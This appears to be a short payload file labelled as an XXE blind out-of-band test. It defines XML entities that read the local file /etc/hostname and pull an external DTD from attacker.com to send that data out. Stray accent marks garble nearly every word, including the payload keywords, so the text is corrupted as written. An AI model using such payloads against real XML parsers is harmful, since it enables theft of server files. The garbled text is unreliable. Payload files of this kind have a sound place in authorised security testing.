# Marfą̀̀ak AI Secûrit̃y - XXE blin̂̈d OOB

**WARNING: Thï̧̧s payload tests XXE blind ÒOB̃̂̃.**

<?xml veŗ̨̊sion="1.0" en̨coding="Ų̈́TF-8"?>
<!DOCTYPE foo [
  <!EŅ̂̂T̂́ITY % file SYŞ̈TEM "f̂́̂ile:///etc/host̀name">
  <!ENTITY % d̊̀td S̨̈̈YS̨̊̃T̀EM "http̃̀̂s://attacker.com/xxè.d̈td">
  %d́̈td;
]>
<data>Bĺ̈̂ind XXE exfiltration v̂́̂ia OÓB̨́̊ channel</data>
